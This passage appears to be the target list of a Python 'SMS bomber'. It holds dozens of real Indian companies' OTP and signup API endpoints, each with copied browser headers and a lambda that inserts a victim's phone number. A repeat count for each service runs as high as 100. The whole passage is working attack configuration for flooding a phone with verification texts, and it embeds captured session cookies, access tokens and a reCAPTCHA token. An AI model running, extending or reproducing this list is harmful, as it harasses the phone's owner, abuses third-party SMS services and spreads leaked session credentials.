        "data": lambda phone: json.dumps({"is_otp": 1, "is_password": 0, "mobile": phone}),
        "count": 15
    },
    
    {
        "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Cookie": "_gcl_au=1.1.994375249.1719049925; _ga=GA1.1.2131701644.1719049925; _ga_Q8HTW71CLJ=GS1.1.1719049925.1.1.1719049936.49.0.0; _ga_BLPG4SY73M=GS1.1.1719049925.1.1.1719049944.41.0.0; _ga_E0K0Q2R7S0=GS1.1.1719049925.1.1.1719049944.0.0.0",
            "Origin": "https://hourlyrooms.co.in",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "access-control-allow-credentials": "true",
            "access-control-allow-origin": "*",
            "content-type": "application/json",
            "platform": "web-2.0.0",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 1
    },
    
    {
        "url": "https://api.madrasmandi.in/api/v1/auth/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ",
            "delivery-type": "instant",
            "mm-build-version": "1.0.1",
            "mm-device-type": "web",
            "origin": "https://madrasmandi.in",
            "priority": "u=1, i",
            "referer": "https://madrasmandi.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n',
        "count": 3
    },
    
    {
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "ci_session=2s7ip3dak5aif2ka77sd2bn9i4nluq2h; _ga=GA1.1.963974262.1718969064; _gcl_au=1.1.1625156903.1718969064; _fbp=fb.1.1718969073282.994122455798043230; _ga_EWGNR5NDJB=GS1.1.1718969063.1.1.1718969167.41.0.0",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
        "count": 50
    },
    
    {
        "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "appversioncode": "5268",
            "clientbuildnumber": "5268",
            "clientplatform": "WEB",
            "content-type": "application/json",
            "origin": "https://web.pagarbook.com",
            "priority": "u=1, i",
            "referer": "https://web.pagarbook.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "userrole": "EMPLOYER"
        },
        "data": lambda phone: json.dumps({"phone": phone, "language": 1}),
        "count": 5
    },
    
    {
        "url": "https://api.vahak.in/v1/u/o_w",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.vahak.in",
            "priority": "u=1, i",
            "referer": "https://www.vahak.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "scope": 0, "request_meta_data": "X0oLFl9sAAZzHuhTmaHk5Bbd+HFZDh+P9J6JhPghG2V1Ymi6OPEu0TH1vS2J2tc58KI/YpjG5tiqVlDkbBCMQCneV7fXtTsYRjhF8FfVNac=", "is_whatsapp": False}),
        "count": 1
    },
    
    {
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://redcliffelabs.com",
            "priority": "u=1, i",
            "referer": "https://redcliffelabs.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "short": True}),
        "count": 1
    },
    
    {
        "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "apikey": "ixiweb\u00212$",
            "clientid": "ixiweb",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": "__cf_bm=FdtmIxlX4PNfSpwYX1qvSdA99iOf9abzGUc7BSSoACw-1715442021-1.0.1.1-74e8P2QKatyvbBQjT7F7nqmbRS2wUmHIqJgmxxVi52EciJqdP_sqwydnwciOjrV8mWhS6v8d2XeMCAckwcbGzA; ixiUID=dc8e7b027263440b83a8; ixiSrc=3J4Sv1FzWiz+BBr0b5qy7LAESHlzQ1ym3JiFkuSC7S5GBZftf5jJ+0yO8gbj/stz5lWZnyT8gvEVf83M6I4pxA==; ixigoSrc=dc8e7b027263440b83a8|DIR:11052024|DIR:11052024|DIR:11052024; _gcl_au=1.1.78477619.1715442051; _ga=GA1.1.92728914.1715442053; _ym_uid=1715442054910529504; _ym_d=1715442054; _ym_isad=2; _ga_LJX9T6MDKX=GS1.1.1715442052.1.1.1715442087.25.0.1092021780; WZRK_G=dd46574995934bd09d3eef419c5501fe; WZRK_S_R5Z-849-WZ4Z=%7B%22p%22%3A1%2C%22s%22%3A1715442104%2C%22t%22%3A1715442223%7D",
            "deviceid": "dc8e7b027263440b83a8",
            "devicetime": "1715442205998",
            "gauth": "0.37EEF3ifZtJrSlsXYM3Jh31RMw1-QXORNR98Jtxx7eFsy48fe3rtoB6fTsPrhJKj9iIq25m-6BK30NAitgfSHcRQ8D9FSVzyFc4Rk4hNYn3Cj7EgBiIaPiIX1UyBrSdNM9p9WYpGH-ijc23okhxAZRhzx_BsPuyU3cPdgDjg1jAIAG_AOYxDZYSDjXBn7wDGv7sak0a4zCLwDef2PT5-pI0ecNnyLKEpNnFUg5O9955k_KjT8g0KuijkxQzMjQTMiqN917tCfcMDaZG1oYmcJjHU7eNxVwrsspE7YKEtrRXW58GAUJdhyFq95PmryvpLcDb3XxFwRw1R_YQgvCHyhPuaiw3WKrXR2Lq_XAgyz4eqv9gLGnSETFQ31dmAfPLcluZow_F7FwEJ_MNK5Q-m7YtO3UHRXMFogYOHtRixfHNu5uptz-tel8SXi414WDyX3VMftHjLgd7IUPaljlOASQ.3JCfm9KSGd3dfmd60LLg2A.fa41f75bb9ec89c96f7f89193863715eef60f7b71dc2d2846ce7de61449ecc4d",
            "ixisrc": "3J4Sv1FzWiz+BBr0b5qy7LAESHlzQ1ym3JiFkuSC7S5GBZftf5jJ+0yO8gbj/stz5lWZnyT8gvEVf83M6I4pxA",
            "origin": "https://www.ixigo.com",
            "priority": "u=1, i",
            "referer": "https://www.ixigo.com/?loginVisible=true",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "uuid": "dc8e7b027263440b83a8"
        },
        "data": lambda phone: f"sixDigitOTP=true&token=1f94cd26e6ace46d55cb10f0f72d29a0c080a14bdfb366d3c549f5000ce0898e514f9bc240f1b66fbf3cb97b65b74665f991767172e62de48edd47e98421d270&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}",
        "count": 1
    },
    
    {
        "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://55club08.in",
            "priority": "u=1, i",
            "referer": "https://55club08.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": f"91{phone}", "codeType": 1, "language": 0, "random": "35ae48f136d74b279dbd0eeb2504e7f8", "signature": "78A2879A0D46B65D257F9B29354B5DBA", "timestamp": 1715445820}),
        "count": 1
    },
    
    {
        "url": "https://zerodha.com/account/registration.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "cookie": "cf_bm=ElnS2p7cn77x_2mWXSAkw8p7DCwRqsLuicR2.A7Yix8-1715445990-1.0.1.1-3r3HzDpdeQsDlj4p6i8hpSHjARApUniHH5VucpQ.RZJ1h7A6HP4H_VTKNiG.el_XckzpYubXRY06y9nP4VedLw; _cfuvid=tQIXhAaSONoNxLn2WTlwUcLy7GvfHXcxlUX0eibyTJY-1715445990470-0.0.1.1-604800000; cf_clearance=9NQLvi9W7gmpLV24ZU7wOokjiHT81xYc1GjJ08iI0-1715446086-1.0.1.1-dUVk1GMFtkdmZ2GfVkAt5GlUzgagCLx_uiFWF1dEWb4oehts1tZSs8pCY7v8G2plkGi1d7FauCePud424H6tMw",
            "origin": "https://zerodha.com",
            "priority": "u=1, i",
            "referer": "https://zerodha.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-arch": '"x86"',
            "sec-ch-ua-bitness": '"64"',
            "sec-ch-ua-full-version": '"124.0.6367.202"',
            "sec-ch-ua-full-version-list": '"Chromium";v="124.0.6367.202", "Google Chrome";v="124.0.6367.202", "Not-A.Brand";v="99.0.0.0"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-model": '""',
            "sec-ch-ua-platform": '"Windows"',
            "sec-ch-ua-platform-version": '"10.0.0"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "source": "zerodha", "partner_id": ""}),
        "count": 100
    },
    
    {
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cache-control": "max-age=0",
            "content-type": "application/json",
            "origin": "https://www.aakash.ac.in",
            "priority": "u=1, i",
            "referer": "https://www.aakash.ac.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"
        },
        "data": lambda phone: json.dumps({"mobile_psid": phone, "mobile_number": "", "activity_type": "aakash-myadmission", "webengageData": {"profile": "student", "whatsapp_opt_in": True, "method": "mobile"}}),
        "count": 100
    },
    
    {
        "url": "https://api.testbook.com/api/v2/mobile/signup?mobile=9856985698&clientId=1117490662.1715447223&sessionId=1715447223",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://testbook.com",
            "priority": "u=1, i",
            "referer": "https://testbook.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-tb-client": "web,1.2"
        },
        "data": lambda phone: json.dumps({"firstVisitSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic", "timestamp": "2024-05-11T17:06:43.000Z", "entrance": "https://testbook.com/", "referralUrl": "https://www.google.com/"}, "signupSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic", "timestamp": "2024-05-11T17:06:43.000Z", "entrance": "https://testbook.com/", "referralUrl": "https://www.google.com/"}, "mobile": phone, "signupDetails": {"page": "HomePage", "pagePath": "/", "pageType": "HomePage"}}),
        "count": 1
    },
    
    {
        "url": "https://loginprod.medibuddy.in/unified-login/user/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.medibuddy.in",
            "priority": "u=1, i",
            "referer": "https://www.medibuddy.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": phone, "flow": "Retail-Login-Home-Flow", "idealLoginFlow": False, "advertiserId": "3893d117-b321-Lba9-815e-db63c64b112a", "mbUserId": None}),
        "count": 50
    },
    
    {
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "varnishPrefixHome=false; utm_source=organic; platform=web; _gcl_au=1.1.838974980.1715509137; _ga=GA1.1.1518972419.1715509138; _fbp=fb.1.1715509139024.1750920090; cto_bundle=pcoVZ19GWldON1ZZbnRiWjcxUW1adHJncjZIWTRRUGVXRThnVWM5WUs4ek0wanRTbEVPWm9qWiUyRmFMMlRkYlhxRDltRVJwNG1iNmhDVEVjYzZWZmRQVHhHNHZhTjlmdDdBdkdTMFBuaGg3Sktlc2duVEx0N1poZWNJWTNsWjVuTUt6JTJCak1vQUFtQ2NiTmdYJTJGdUU4N3kxM1AwTXclM0QlM0Q; _ga_WQREN8TJ7R=GS1.1.1715509138.1.1.1715509192.6.0.0",
            "origin": "https://www.spinny.com",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://www.spinny.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA46Lsb5HaQXtezpeMPCnDMfDzkpcK-Q4zgi3w8ugXsZ9WStLQWSVWgh25WKbrOY2eCyC--nleXQBQ-9s8HDrqzBM6BIMDfkNpguN6krwHF3mdRTxTBEtt5NAUV8XF6VHAe2CeU4G7Qb10qUjUtEsQt4lTCa-bka2SK0VipNsIe4zP2kygDwqB5o1SyZms7t48Ku04fQmJSEJpYpi68ZXTJi7FjVyh01JLnu7ms1juztvZ7uMwMXHt4miFYAQlX9eglyPA-PKQbV8L-ILU8Z3sthWDNs6GJhDH-rnRK-ryOOAZDN2dDJd_ab4-RNj_5e8KJOruIg9uPHckSmRtm6xUVkDNjNn1fsGiQRGrAzpBmEOwRi5IEB-qFoVEEl4hFqBOLuRF386OBlfJrMJi4Cs766kprWznF8Sms9mHhU6JZA_m4H-I8zcCh3Bs4LYIZPH2iLRBqxUbGFLK-OL3_mcCLHIf3KXBD1sOFR7yithP3zw9RKDTxNjabd95yDuPLMjZpjggHKnEJY2xKekApjxMd9PlCBgm7TtcAelz5bRzugVA_-uo8ZxFzlGGnIUfqBwiCF-3Kim010z5jQCXRh39nnqXZumIomcLmcJqr-Rb71saIzr7dk4D4jXiAaxCadFSTXTDBFBpCbg3n3m331s54Sr96Qd3dPUmYMF1cgYXjimuRlUeHTEmOQXLtfO1_quzZXTKfodooPv5Hf1guiTYX9U75Fan3nvqNYLJWNKHoxZhvQsd88F9PprWh5qMg3MXs9Qz1PAtTWQHjOZnmzUvSUNYWxUg4uaYhucG1it62ncpYZpmDonvpLQyFwLfdKMJvPjyHudVfUgwR5ZIClGZVklhkCVqecbsH8K1WuQ-T5FVeNC1G2aca-pJkqG-U_2FOslhHT6W6bsX0MKr-zKZ77m-34zEQYlLpvNC2AfVng1YQbwT9unslwfuqnf_wGLKQbU9EIWTlJ__7WfanTI-XhDRbavzVcFhFfNvPweIFzgJlfaSSsWdvhZbEJ_tKVYplQ5_HHpcCvxD15cdnYKdmyr1z9LDMOMLjmuTzqneqWLU3POHwNZ6oJ_-P9qmJsCay-GqsbF8Wt3TxmgQ_2DRvj0JwVp3Yg3GB8AtPquN331LS4CzwvWNMiiPEXKpIlS9TeWSRgEdJtS9DMFyEn6pmkO22DoEkbp59BB2PtxGxtkbVG7rBOUhWtTqqBvRy6v6WCOjn2OQEREGoJKBU702UwYDmurrNimGeQCRhmTiKX-Qy3HINJmkN6FxEZulijqyBsS7CRifx8OmURflTnzpVsnJForYAe5uLm_KsJBxvC5TgMGsmlxd5Lkf1TKcCmCCC2ldo1A8RIBZ6LAvPqgLJtTPmPmX-p6NcbGOwYHESBI_ZLVN0OhiJxbVRowq72EZH7QIJX2yKUFZts6UHk_l-VccQAGvXJrCSEIpUMpIvnBCY5UU4RnfB-pqM1UvhbIneE3JbXE03zb84yasVWrt9b0NbnaQbSHGC7OBxF9yA8zBaGC1bn4riqLBHMYWewzQ3-dHcnoB8YkaXLAs3vydK7O-HO46ciPHH78CzgJykwHrgh6At5X8cT1Rlr9yIZR-GujFw3TOhOHPK9M5HmEvmUaESbRzoGbTuwhQRSA8BMqRiwKT_6aEBSbcBpBVnloSPyNHcLCqY1W1WditMKahnMZOvf0Y_G90IzfqxWkCHfQTvGBaRaAMgZTejWRHoQfqXvwXMYs32EXklZVGmAl2lzFBMiLQ", "expected_action": "login"}),
        "count": 3
    },
    
    {
        "url": "https://api.tradeindia.com/home/registration/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundarypzpW5AB7AKLEX4iX",
            "cookie": "_gcl_au=1.1.1130160145.1715510372; _ga_VTLSYCYF27=GS1.1.1715510372.1.0.1715510372.60.0.0; _ga=GA1.1.996518352.1715510373; NEW_TI_SESSION_COOKIE=81C3e74991c15Fe2318Eb70fa3a3a70B",
            "origin": "https://www.tradeindia.com",
            "priority": "u=1, i",
            "referer": "https://www.tradeindia.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="name"\r\n\r\natyug\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="email"\r\n\r\ndrhufj@gmail.com\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="co_name"\r\n\r\njoguo9igu89gu\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="pin_code"\r\n\r\n110086\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="state"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="alpha_country_code"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="city"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="city_id"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="source"\r\n\r\n{{}}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX--\r\n',
        "count": 1
    },
    
    {
        "url": "https://www.beyoung.in/api/sendOtp.json",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "access-token": "JQ0fUq6r6dhzJHRLSdn3J6kyzNXumrEM9gy+q8456XEsQISIKfb31Wiyx/VhM84NYcBLGRVjXeU4GqYWDAJpwQ==",
            "cache-control": "no-cache",
            "content-type": "application/json;charset=UTF-8",
            "cookie": "_gcl_au=1.1.440185340.1715511785; _ga=GA1.1.1075884316.1715511787; _ga_7YP4PPR9HS=GS1.1.1715511786.1.0.1715511788.58.0.0; user_id_t=15c6486a-e8ea-4a7e-8551-2069ec30fe70; _fbp=fb.1.1715511794344.1331412975",
            "expires": "0",
            "origin": "https://www.beyoung.in",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://www.beyoung.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "visitor": "477701202435772"
        },
        "data": lambda phone: json.dumps({"username": phone, "username_type": "mobile", "service_type": 0, "vid": "477701202435772"}),
        "count": 100
    },
    
    {
        "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "action": "sendOTP",
            "content-type": "application/json",
            "origin": "https://wrogn.com",
            "priority": "u=1, i",
            "referer": "https://wrogn.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "shop_name": "wrogn-website.myshopify.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"username": f"+91{phone}", "type": "mobile", "domain": "wrogn.com", "recaptcha_token": ""}),
        "count": 5
    },
    
    {
        "url": "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app-platform": "web",
            "authorization": "Bearer",
            "content-type": "application/json",
            "device_id": "6641194520998",
            "langcode": "en",
            "origin": "https://www.medkart.in",
            "priority": "u=1, i",
            "referer": "https://www.medkart.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_no": phone}),
        "count": 1
    },
    
    {
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "isweb": "true",
            "origin": "https://mamaearth.in",
            "priority": "u=1, i",
            "referer": "https://mamaearth.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "referralCode": ""}),
        "count": 10
    },
    
    {
        "url": "https://www.coverfox.com/otp/send/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
